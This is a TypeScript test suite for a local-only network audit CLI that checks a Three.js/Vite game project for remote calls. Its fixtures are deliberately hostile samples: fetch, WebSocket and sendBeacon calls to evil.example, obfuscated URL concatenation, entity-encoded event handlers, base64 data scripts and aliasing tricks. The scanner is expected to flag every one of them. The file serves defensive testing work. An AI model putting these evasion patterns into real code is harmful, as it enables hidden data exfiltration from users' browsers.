/** Focused CLI tests for audit-local-only.ts. */

import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import test from 'node:test';
import { fileURLToPath } from 'node:url';

const SCRIPT = join(dirname(fileURLToPath(import.meta.url)), 'audit-local-only.ts');
const THREE_SOURCE = join(
  dirname(SCRIPT),
  '..',
  'assets',
  'threejs-vite-game',
  'node_modules',
  'three',
  'src',
  'loaders',
);
const SCAFFOLD_NODE_MODULES = join(
  dirname(SCRIPT),
  '..',
  'assets',
  'threejs-vite-game',
  'node_modules',
);

interface AuditResult {
  status: number | null;
  stdout: string;
  stderr: string;
}

interface RunOptions {
  baseline?: string;
  args?: string[];
  setup?: (root: string) => void;
}

function runAudit(
  files: Readonly<Record<string, string>>,
  options: RunOptions = {},
): AuditResult {
  const directory = mkdtempSync(join(tmpdir(), 'audit-local-only-'));
  try {
    const root = join(directory, 'project');
    mkdirSync(root, { recursive: true });
    for (const [relativePath, content] of Object.entries(files)) {
      const path = join(root, relativePath);
      mkdirSync(dirname(path), { recursive: true });
      writeFileSync(path, content, 'utf8');
    }
    options.setup?.(root);

    const command = ['--import', 'tsx', SCRIPT, root, ...(options.args ?? [])];
    if (options.baseline !== undefined) {
      const baselinePath = join(directory, 'baseline-package.json');
      writeFileSync(baselinePath, options.baseline, 'utf8');
      command.push('--baseline-package-json', baselinePath);
    }
    const result = spawnSync(process.execPath, command, { encoding: 'utf8' });
    if (result.error) throw result.error;
    return {
      status: result.status,
      stdout: result.stdout,
      stderr: result.stderr,
    };
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
}

function diagnostic(result: AuditResult): string {
  return result.stdout + result.stderr;
}

test('accepts Three.js, relative assets, exact loopback URLs, and config tooling', () => {
  const result = runAudit({
    'package.json': JSON.stringify({
      homepage: 'https://example.com/source',
      dependencies: { three: '^0.184.0' },
      devDependencies: { vite: '^8.0.0' },
    }),
    'index.html': '<script type="module" src="/src/main.ts"></script>',
    'src/main.ts': [
      "import * as THREE from 'three';",
      "import './style.css';",
      "const preview = 'http://localhost:5173/game/';",
      'void THREE; void preview;',
    ].join('\n'),
    'src/style.css': 'body { background: #000; }',
    'public/favicon.svg': '<svg xmlns="http://www.w3.org/2000/svg"></svg>',
    'vite.config.ts': "import { defineConfig } from 'vite'; export default defineConfig({});",
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('accepts exact protocol-relative loopback URLs', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.ts': [
      "const host = '//localhost:5188/game';",
      "const ipv4 = '//127.0.0.1:5188/game';",
      "const ipv6 = '//[::1]:5188/game';",
      'void host; void ipv4; void ipv6;',
    ].join('\n'),
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('rejects protocol-relative loopback suffix attacks', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.ts': "const endpoint = '//localhost.evil/collect'; void endpoint;",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /protocol-relative URL/);
});

test('rejects protocol-relative userinfo disguised as loopback', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.ts': "const endpoint = '//localhost@evil.example/collect'; void endpoint;",
    'src/style.css': 'body { background: url(//127.0.0.1@evil.example/image.png); }',
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/protocol-relative URL/g)?.length, 2);
});

test('rejects remote fetches and unapproved runtime packages', () => {
  const result = runAudit({
    'package.json': JSON.stringify({
      dependencies: { three: '^0.184.0', axios: '^1.0.0' },
    }),
    'src/main.ts': "fetch('https://example.com/model.glb');",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /remote URL/);
  assert.match(result.stdout, /fetch call/);
  assert.match(result.stdout, /unapproved runtime package/);
});

test('scans modern TypeScript module extensions', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.mts': "fetch('https://example.com/model.glb');",
    'server/socket.cts': "import net from 'node:net';\nnet.connect(443);",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /remote URL/);
  assert.match(result.stdout, /fetch call/);
  assert.match(result.stdout, /unapproved bare runtime import/);
});

test('walks runtime code outside the historical fixed root list', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'components/client.ts': "fetch('https://evil.example/collect');\n",
    'lib/socket.ts': "new WebSocket('wss://evil.example/live');\n",
    'packages/game/client.ts': "navigator.sendBeacon('https://evil.example/metrics');\n",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /components\/client\.ts/);
  assert.match(result.stdout, /lib\/socket\.ts/);
  assert.match(result.stdout, /packages\/game\/client\.ts/);
});

test('scans nested runtime scripts/tests and dynamic emitted network targets', () => {
  const result = runAudit({
    'package.json': '{}',
    'src/main.ts': "import './scripts/hidden.ts';\nimport './tests/runtime.ts';\n",
    'src/scripts/hidden.ts': 'fetch(globalThis.location.hash.slice(1));\n',
    'src/tests/runtime.ts': 'new WebSocket(window.location.search);\n',
    'dist/assets/app.js': 'fetch(globalThis.location.hash.slice(1));\n',
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /src\/scripts\/hidden\.ts:1: fetch call/);
  assert.match(result.stdout, /src\/tests\/runtime\.ts:1: WebSocket/);
  assert.match(
    result.stdout,
    /dist\/assets\/app\.js:1: bundled dynamic network target/,
  );
});

test('keeps root project tooling and tests outside the runtime audit', () => {
  const result = runAudit({
    'package.json': '{}',
    'src/main.ts': 'export const local = true;\n',
    'scripts/release.ts': "fetch('https://tooling.example/release');\n",
    'tests/browser.test.ts': "fetch('https://fixture.example/state');\n",
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('does not let emitted package metadata hide nested scripts/tests', () => {
  const result = runAudit({
    'package.json': '{}',
    'dist/package.json': '{}',
    'dist/scripts/app.js': 'fetch(globalThis.location.hash.slice(1));\n',
    'dist/tests/socket.js': 'new WebSocket(globalThis.location.search);\n',
    'dist/artifacts/metrics.js': 'navigator.sendBeacon(location.pathname);\n',
    'dist/node_modules/payload.js': 'import(location.hash.slice(1));\n',
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /dist\/scripts\/app\.js/);
  assert.match(result.stdout, /dist\/tests\/socket\.js/);
  assert.equal(result.stdout.match(/bundled dynamic network target/g)?.length, 4);
});

test('does not treat localhost suffix attacks as loopback URLs', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.ts': [
      "const direct = 'http://localhost.evil/collect';",
      "const port = 'http://localhost:5173.evil/collect';",
      'void direct; void port;',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/remote URL/g)?.length, 2);
});

test('allows only dependencies recorded exactly in the baseline', () => {
  const result = runAudit(
    {
      'package.json': JSON.stringify({
        dependencies: {
          three: '^0.184.0',
          'local-physics': 'file:../local-physics',
        },
      }),
      'src/main.ts': "import physics from 'local-physics'; void physics;",
    },
    {
      baseline: JSON.stringify({
        dependencies: { 'local-physics': 'file:../local-physics' },
      }),
    },
  );
  assert.equal(result.status, 0, diagnostic(result));
});

test('rejects optional and bracket network calls across common source roots', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'app/main.ts': "globalThis.fetch?.(url); window['fetch'](url); navigator.sendBeacon?.('/x');",
    'workers/sync.js': 'importScripts(endpoint); new WebTransport(endpoint);',
  });
  assert.equal(result.status, 1);
  assert.ok((result.stdout.match(/fetch call/g)?.length ?? 0) >= 2);
  assert.match(result.stdout, /sendBeacon/);
  assert.match(result.stdout, /importScripts/);
  assert.match(result.stdout, /WebTransport/);
});

test('rejects remote config values and protocol-relative IP URLs', () => {
  const result = runAudit({
    'package.json': JSON.stringify({
      dependencies: { three: '^0.184.0' },
      devDependencies: { vite: '^8.0.0' },
    }),
    'vite.config.ts': [
      "import { defineConfig } from 'vite';",
      "const endpoint = '//10.0.0.8/collect';",
      'export default defineConfig({});',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /protocol-relative URL/);
});

test('rejects host-only protocol-relative CSS URLs', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/style.css': 'body { background-image: url(//cdn.example.com); }',
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /protocol-relative URL/);
});

test('rejects single-label protocol-relative hosts with paths', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/main.ts': "const endpoint = '//collector/ingest'; void endpoint;",
    'src/style.css': 'body { background-image: url(//cdn/image.png); }',
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/protocol-relative URL/g)?.length, 2);
});

test('rejects CommonJS bare runtime imports', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'server/main.cjs': "const cloud = require('cloud-sdk'); void cloud;",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /unapproved bare runtime import/);
});

test('ignores provenance URLs and network words in JavaScript comments', () => {
  const result = runAudit({
    'package.json': JSON.stringify({
      homepage: 'https://example.com/source',
      dependencies: { three: '^0.184.0' },
    }),
    'src/main.ts': [
      '// Source: https://example.com/paper; do not fetch at runtime',
      'const shader = `// https://example.com/shader-paper\\nvoid main(){}`;',
      "import * as THREE from 'three';",
      'void shader; void THREE;',
    ].join('\n'),
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('allows the structural Vite preload polyfill and shader comments', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'dist/app.js': [
      "fetch('/chunk.js');",
      '(function () {',
      "  const relList = document.createElement('link').relList;",
      "  if (relList && relList.supports && relList.supports('modulepreload')) return;",
      "  for (const link of document.querySelectorAll('link[rel=\"modulepreload\"]')) preload(link);",
      '  new MutationObserver((records) => {',
      '    for (const record of records) for (const link of record.addedNodes) {',
      "      if (link.tagName === 'LINK' && link.rel === 'modulepreload') preload(link);",
      '    }',
      '  }).observe(document, { childList: true, subtree: true });',
      '  function options(link) {',
      '    const result = {};',
      '    link.integrity && (result.integrity = link.integrity);',
      '    link.referrerPolicy && (result.referrerPolicy = link.referrerPolicy);',
      "    link.crossOrigin === 'use-credentials' ? result.credentials = 'include' :",
      "      link.crossOrigin === 'anonymous' ? result.credentials = 'omit' : result.credentials = 'same-origin';",
      '    return result;',
      '  }',
      '  function preload(link) {',
      '    if (link.ep) return;',
      '    link.ep = true;',
      '    const requestOptions = options(link);',
      '    fetch(link.href, requestOptions);',
      '  }',
      '})();',
      'const shader = `// https://example.com/paper\\nvoid main(){}`;',
    ].join('\n'),
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('rejects marker/string spoofs and non-global fetch in Vite-shaped code', () => {
  const markerSpoof = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      "const decoy = 'link[rel=\"modulepreload\"] MutationObserver modulepreload';",
      '// document.querySelectorAll and MutationObserver are not executable flow.',
      'function preload(link) { if (link.ep) return; link.ep = true; fetch(link.href); }',
    ].join('\n'),
  });
  assert.equal(markerSpoof.status, 1);
  assert.match(markerSpoof.stdout, /bundled dynamic network target/);

  const clientMethod = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      '(function () {',
      "  const relList = document.createElement('link').relList;",
      "  if (relList.supports('modulepreload')) return;",
      "  for (const link of document.querySelectorAll('link[rel=\"modulepreload\"]')) preload(link);",
      '  new MutationObserver((records) => { for (const record of records) for (const link of record.addedNodes)',
      "    if (link.tagName === 'LINK' && link.rel === 'modulepreload') preload(link);",
      '  }).observe(document, { childList: true, subtree: true });',
      '  function options(link) { const o = {}; link.integrity && (o.integrity = link.integrity);',
      '    link.referrerPolicy && (o.referrerPolicy = link.referrerPolicy);',
      "    link.crossOrigin === 'use-credentials' ? o.credentials = 'include' :",
      "      link.crossOrigin === 'anonymous' ? o.credentials = 'omit' : o.credentials = 'same-origin'; return o; }",
      '  function preload(link) { if (link.ep) return; link.ep = true;',
      '    const opts = options(link); client.fetch(link.href, opts); }',
      '})();',
    ].join('\n'),
  });
  assert.equal(clientMethod.status, 1);
  assert.match(clientMethod.stdout, /bundled dynamic network target/);

  const extraCaller = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      '(function () {',
      "  const relList = document.createElement('link').relList;",
      "  if (relList.supports('modulepreload')) return;",
      "  for (const link of document.querySelectorAll('link[rel=\"modulepreload\"]')) preload(link);",
      '  new MutationObserver((records) => { for (const record of records) for (const link of record.addedNodes)',
      "    if (link.tagName === 'LINK' && link.rel === 'modulepreload') preload(link);",
      '  }).observe(document, { childList: true, subtree: true });',
      '  function options(link) { const o = {}; link.integrity && (o.integrity = link.integrity);',
      '    link.referrerPolicy && (o.referrerPolicy = link.referrerPolicy);',
      "    link.crossOrigin === 'use-credentials' ? o.credentials = 'include' :",
      "      link.crossOrigin === 'anonymous' ? o.credentials = 'omit' : o.credentials = 'same-origin'; return o; }",
      '  function preload(link) { if (link.ep) return; link.ep = true;',
      '    const opts = options(link); fetch(link.href, opts); }',
      '  preload({ href: location.hash.slice(1), ep: false });',
      '})();',
    ].join('\n'),
  });
  assert.equal(extraCaller.status, 1);
  assert.match(extraCaller.stdout, /fetch: link\.href/);
});

test('rejects dynamic emitted sinks but permits recognized Three.js loader fetches', () => {
  const rejected = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      'const endpoint = globalThis.location.hash.slice(1);',
      'fetch(endpoint);',
      'navigator.sendBeacon(endpoint);',
      'importScripts(endpoint);',
      'new WebSocket(endpoint);',
      'new EventSource(endpoint);',
      'new WebTransport(endpoint);',
      'const request = new XMLHttpRequest();',
      "request.open('GET', endpoint);",
      'new RTCPeerConnection();',
    ].join('\n'),
  });
  assert.equal(rejected.status, 1);
  assert.ok(
    (rejected.stdout.match(/bundled dynamic network target/g)?.length ?? 0) >= 7,
    rejected.stdout,
  );
  assert.match(rejected.stdout, /bundled network API: RTCPeerConnection/);

  const markerSpoof = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.185.1' } }),
    'dist/app.js': [
      'class FileLoader {',
      '  load(url) {',
      "    const req = new Request(url, { credentials: 'same-origin' });",
      '    fetch(req);',
      "    console.warn('FileLoader: HTTP Status 0 received.');",
      "    response.headers.get('X-File-Size');",
      '  }',
      '}',
      'class ImageBitmapLoader {',
      '  load(url) {',
      '    fetch(url).then((response) => response.blob()).then(createImageBitmap);',
      "    Cache.add('image-bitmap:' + url, true);",
      '  }',
      '}',
    ].join('\n'),
  });
  assert.equal(markerSpoof.status, 1);
  assert.equal(markerSpoof.stdout.match(/bundled dynamic network target/g)?.length, 2);

  const threeLoaders = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.185.1' } }),
    'dist/app.js': [
      'class FileLoader {',
      '  load(url) {',
      '    url = this.manager.resolveURL(url);',
      '    Cache.get(`file:${url}`); this.manager.itemStart(url);',
      '    const req = new Request(url, {',
      '      headers: new Headers(this.requestHeader),',
      "      credentials: this.withCredentials ? 'include' : 'same-origin',",
      '      signal: AbortSignal.any([this._abortController.signal, this.manager.abortController.signal]),',
      '    });',
      '    fetch(req).then((response) => {',
      '      if (response.status === 200 || response.status === 0) {}',
      "      response.headers.get('X-File-Size') || response.headers.get('Content-Length');",
      '      const stream = new ReadableStream({}); return new Response(stream);',
      '    });',
      '    Cache.add(`file:${url}`, true); this.manager.itemEnd(url);',
      '  }',
      '}',
      'class ImageBitmapLoader {',
      '  load(url) {',
      '    url = this.manager.resolveURL(url); const scope = this;',
      '    const fetchOptions = {};',
      "    fetchOptions.credentials = this.crossOrigin === 'anonymous' ? 'same-origin' : 'include';",
      '    fetchOptions.headers = this.requestHeader;',
      '    fetchOptions.signal = AbortSignal.any([this._abortController.signal, this.manager.abortController.signal]);',
      '    fetch(url, fetchOptions).then((response) => response.blob())',
      "      .then((blob) => createImageBitmap(blob, Object.assign(scope.options, { colorSpaceConversion: 'none' })));",
      '    scope.manager.itemStart(url); scope.manager.itemEnd(url);',
      '  }',
      '}',
    ].join('\n'),
  });
  assert.equal(threeLoaders.status, 0, diagnostic(threeLoaders));
});

test('rejects parenthesized aliases, destructured globals, and assigned XHR', () => {
  const result = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      'const { fetch: f, WebSocket: WS } = globalThis;',
      '(f)(location.hash.slice(1));',
      'new (WS)(location.search);',
      'let RequestType = XMLHttpRequest;',
      'let request;',
      'request = new (RequestType)();',
      "request['open']('GET', location.pathname);",
      'function first() { const { WebSocket: shared } = globalThis; new shared(location.hash); }',
      'function second() { const { fetch: shared } = globalThis; shared(location.hash); }',
      'first(); second();',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.ok(
    (result.stdout.match(/bundled dynamic network target/g)?.length ?? 0) >= 5,
    result.stdout,
  );
});

test('accepts the actual pinned r185 FileLoader and ImageBitmapLoader sources', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.185.1' } }),
    'dist/FileLoader.js': readFileSync(join(THREE_SOURCE, 'FileLoader.js'), 'utf8'),
    'dist/ImageBitmapLoader.js': readFileSync(
      join(THREE_SOURCE, 'ImageBitmapLoader.js'),
      'utf8',
    ),
  });
  assert.equal(result.status, 0, diagnostic(result));

  const remoteCaller = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.185.1' } }),
    'dist/FileLoader.js': [
      readFileSync(join(THREE_SOURCE, 'FileLoader.js'), 'utf8'),
      'new FileLoader().load(location.hash.slice(1));',
    ].join('\n'),
  });
  assert.equal(remoteCaller.status, 1);
  assert.match(remoteCaller.stdout, /loader\.load/);
});

test('accepts a real local GLTFLoader bundle and rejects a runtime-derived URL', () => {
  const directory = mkdtempSync(join(tmpdir(), 'audit-gltf-bundle-'));
  try {
    const root = join(directory, 'project');
    mkdirSync(join(root, 'src'), { recursive: true });
    writeFileSync(
      join(root, 'package.json'),
      JSON.stringify({ type: 'module', dependencies: { three: '^0.185.1' } }),
      'utf8',
    );
    writeFileSync(
      join(root, 'index.html'),
      '<script type="module" src="/src/main.js"></script>',
      'utf8',
    );
    const threeModule = join(SCAFFOLD_NODE_MODULES, 'three', 'build', 'three.module.js');
    const loaderModule = join(
      SCAFFOLD_NODE_MODULES,
      'three',
      'examples',
      'jsm',
      'loaders',
      'GLTFLoader.js',
    );
    writeFileSync(
      join(root, 'vite.config.mjs'),
      `export default { resolve: { alias: [` +
        `{ find: /^three\\/addons\\/loaders\\/GLTFLoader\\.js$/, replacement: ${JSON.stringify(loaderModule)} },` +
        `{ find: /^three$/, replacement: ${JSON.stringify(threeModule)} }] } };`,
      'utf8',
    );
    const build = (): void => {
      const result = spawnSync(
        process.execPath,
        [join(SCAFFOLD_NODE_MODULES, 'vite', 'bin', 'vite.js'), 'build'],
        { cwd: root, encoding: 'utf8' },
      );
      assert.equal(result.status, 0, result.stdout + result.stderr);
    };
    const audit = (): AuditResult => {
      const result = spawnSync(
        process.execPath,
        ['--import', 'tsx', SCRIPT, root],
        { encoding: 'utf8' },
      );
      return { status: result.status, stdout: result.stdout, stderr: result.stderr };
    };

    writeFileSync(
      join(root, 'src', 'main.js'),
      "import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js'; new GLTFLoader().load('/assets/model.gltf', () => {});",
      'utf8',
    );
    build();
    const local = audit();
    assert.equal(local.status, 0, diagnostic(local));

    writeFileSync(
      join(root, 'src', 'main.js'),
      "import { GLTFLoader } from 'three/addons/loaders/GLTFLoader.js'; new GLTFLoader().load(location.hash.slice(1), () => {});",
      'utf8',
    );
    build();
    const remote = audit();
    assert.equal(remote.status, 1);
    assert.match(remote.stdout, /loader\.load/);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});

test('does not use same-name declarations from sibling scopes as constants', () => {
  const result = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      "function leak() { const u = 'ht' + 'tps:' + '/' + '/evil.example'; fetch(u); }",
      "function safe() { const u = '/local'; return u; }",
      'leak(); safe();',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /bundled dynamic network target/);
});

test('audits executable inline scripts in emitted HTML and SVG', () => {
  const result = runAudit({
    'package.json': '{}',
    'dist/index.html': [
      '<!doctype html>',
      "<script type='MODULE' data-x='>'>fetch(location.hash.slice(1));</script>",
      '<script data-type="application/json">fetch(location.hash);</script>',
      '<script type="m&#111;dule">fetch(location.search);</script>',
      '<script>//</script><script>fetch(location.pathname);</script>',
      '<body onload=fetch(location.hash.slice(1))>',
      '<body onload="fetch(location.search)">',
      '<a href="javascript:fetch(location.pathname)">go</a>',
      '<img src="https&#x3A;&#x2F;&#x2F;evil.example/pixel">',
      '<img src=https&#x3A;&#x2F;&#x2F;evil.example/unquoted>',
    ].join('\n'),
    'dist/icon.svg': [
      '<svg xmlns="http://www.w3.org/2000/svg">',
      '<script><![CDATA[new WebSocket(location.search);]]></script>',
      '</svg>',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /dist\/index\.html:2: bundled dynamic network target/);
  assert.match(result.stdout, /dist\/icon\.svg:2: bundled dynamic network target/);
  assert.ok((result.stdout.match(/dist\/index\.html/g)?.length ?? 0) >= 9);
});

test('rejects browser-normalized executable markup edge cases', () => {
  const fixtures: Array<readonly [string, Record<string, string>, RegExp]> = [
    [
      'semicolonless numeric entity in an event handler',
      {
        'package.json': '{}',
        'dist/index.html': '<body onload="f&#101tch(\'https:\'+\'/\'+\'/example.invalid/ping\')">',
      },
      /bundled non-local network target/,
    ],
    [
      'XML entity in an SVG script body',
      {
        'package.json': '{}',
        'dist/icon.svg': '<svg xmlns="http://www.w3.org/2000/svg"><script>f&#101;tch(\'https:\'+\'/\'+\'/example.invalid/ping\')</script></svg>',
      },
      /bundled non-local network target/,
    ],
    [
      'base64 data script source',
      {
        'package.json': '{}',
        'dist/index.html': '<script src="data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vZXhhbXBsZS5pbnZhbGlkL3BpbmciKQ=="></script>',
      },
      /executable data script is not allowed/,
    ],
    [
      'javascript URL containing a decoded tab',
      {
        'package.json': '{}',
        'dist/index.html': '<a href="java&#9;script:fetch(\'https:\'+\'/\'+\'/example.invalid/ping\')">go</a>',
      },
      /bundled non-local network target/,
    ],
    [
      'script end tag with ignored attributes',
      {
        'package.json': '{}',
        'dist/index.html': '<script>fetch(\'https:\'+\'/\'+\'/example.invalid/ping\')</script x>',
      },
      /bundled non-local network target/,
    ],
  ];

  for (const [name, files, expected] of fixtures) {
    const result = runAudit(files);
    assert.equal(result.status, 1, `${name}: ${diagnostic(result)}`);
    assert.match(result.stdout, expected, name);
  }
});

test('rejects wrapper calls, URL whitespace, dynamic imports, and DOM resources', () => {
  const result = runAudit({
    'package.json': '{}',
    'dist/app.js': [
      "fetch.call(null, location.hash.slice(1));",
      "const bound = fetch.bind(null); bound(location.search);",
      "globalThis['fe' + 'tch'](location.hash);",
      'Reflect.apply(fetch, null, [location.search]);',
      "fetch(' ' + 'https:' + '/' + '/evil.example/data');",
      "fetch('ht\\ttps:' + '/' + '/evil.example/tab');",
      'import(location.pathname);',
      'const script = document.createElement(\'script\'); script.src = location.hash;',
      "script.setAttribute('src', location.search);",
      'const box = { request: new XMLHttpRequest() };',
      "box.request.open('GET', location.search);",
      "box.request.open.call(box.request, 'GET', location.hash);",
      'function inject(url) { script.src = url; }',
      'inject(location.hash.slice(1));',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.ok(
    (result.stdout.match(/bundled dynamic network target/g)?.length ?? 0) >= 10,
    result.stdout,
  );
  assert.ok(
    (result.stdout.match(/bundled non-local network target/g)?.length ?? 0) >= 2,
    result.stdout,
  );
});

test('rejects symbolic links before applying root tooling exclusions', () => {
  const result = runAudit(
    {
      'package.json': '{}',
      'src/tool.ts': 'export const local = true;\n',
    },
    {
      setup(root) {
        symlinkSync('../src', join(root, 'scripts'));
      },
    },
  );
  assert.equal(result.status, 1);
  assert.match(result.stdout, /scripts:1: runtime symbolic link is not allowed/);
});

test('constant-folds hidden remote targets in built fetch and XHR calls', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'dist/app.js': [
      "fetch('https:' + '/' + '/evil.example/collect');",
      'const request = new XMLHttpRequest();',
      "request.open('POST', 'https:' + '/' + '/evil.example/metrics');",
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/bundled non-local network target/g)?.length, 2);
});

test('allows constant-folded local targets in built fetch and XHR calls', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'dist/app.js': [
      "fetch('/' + 'assets/chunk.js');",
      'const request = new XMLHttpRequest();',
      "request.open('GET', '/state.json');",
    ].join('\n'),
  });
  assert.equal(result.status, 0, diagnostic(result));
});

test('decodes escaped URLs in JSON and JavaScript runtime strings', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'components/config.json':
      '{"api":"https:\\/\\/evil.example\\/collect"}',
    'lib/model.ts':
      "const model = 'https:\\/\\/evil.example\\/hero.glb'; loader.load(model);\n",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /components\/config\.json/);
  assert.match(result.stdout, /lib\/model\.ts/);
});

test('scans executable component scripts and Astro frontmatter', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'src/App.vue': [
      '<script setup lang="ts">',
      "fetch('https://evil.example/vue');",
      '</script>',
      '<style>/* https://style.example/citation */</style>',
    ].join('\n'),
    'src/Page.astro': [
      '---',
      "const endpoint = 'https://evil.example/astro';",
      '---',
      '<div>Local markup</div>',
    ].join('\n'),
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /src\/App\.vue/);
  assert.match(result.stdout, /src\/Page\.astro/);
  assert.doesNotMatch(result.stdout, /style\.example/);
});

test('rejects runtime symbolic links instead of silently following or skipping them', () => {
  const result = runAudit(
    {
      'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
      'src/real.ts': 'export const local = true;\n',
      'shared/current.ts': 'export const current = true;\n',
    },
    {
      setup(root) {
        symlinkSync('real.ts', join(root, 'src/linked.ts'));
        symlinkSync('../shared', join(root, 'src/linked-directory'));
      },
    },
  );
  assert.equal(result.status, 1);
  assert.equal(result.stdout.match(/runtime symbolic link is not allowed/g)?.length, 2);
});

test('rejects diagnostics in release dist and skips instrumented alternate output', () => {
  const rejected = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'dist/app.js': 'globalThis.__THREE_GAME_TEST_HOOKS__ = {};\n',
  });
  assert.equal(rejected.status, 1);
  assert.match(rejected.stdout, /production diagnostics hook/);

  const alternate = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    '.e2e-dist/app.js': 'globalThis.__THREE_GAME_DIAGNOSTICS__ = {};\n',
    'dist/app.js': 'export const clean = true;\n',
  });
  assert.equal(alternate.status, 0, diagnostic(alternate));
});

test('still rejects remote literals in built bundles', () => {
  const result = runAudit({
    'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }),
    'dist/app.js': "const endpoint = 'https://example.com/collect';",
  });
  assert.equal(result.status, 1);
  assert.match(result.stdout, /remote URL/);
});

test('returns exit code 2 for a malformed baseline package', () => {
  const result = runAudit(
    { 'package.json': JSON.stringify({ dependencies: { three: '^0.184.0' } }) },
    { baseline: '{not-json' },
  );
  assert.equal(result.status, 2);
  assert.match(result.stderr, /Invalid baseline package\.json/);
});

test('returns exit code 2 for invalid CLI arguments', () => {
  const result = runAudit({}, { args: ['--unknown-option'] });
  assert.equal(result.status, 2);
  assert.match(result.stderr, /unrecognized argument/);
});

test('runs the CLI main guard when invoked through a symbolic link', () => {
  const directory = mkdtempSync(join(tmpdir(), 'audit-local-main-link-'));
  try {
    const root = join(directory, 'project');
    mkdirSync(root, { recursive: true });
    writeFileSync(
      join(root, 'package.json'),
      JSON.stringify({ dependencies: { three: '^0.185.0' } }),
      'utf8',
    );
    const linkedScript = join(directory, 'audit-local-linked.ts');
    symlinkSync(SCRIPT, linkedScript);
    const result = spawnSync(
      process.execPath,
      ['--import', 'tsx', linkedScript, root],
      { encoding: 'utf8' },
    );
    assert.equal(result.status, 0, result.stdout + result.stderr);
    assert.match(result.stdout, /Local-only audit passed/);
  } finally {
    rmSync(directory, { recursive: true, force: true });
  }
});
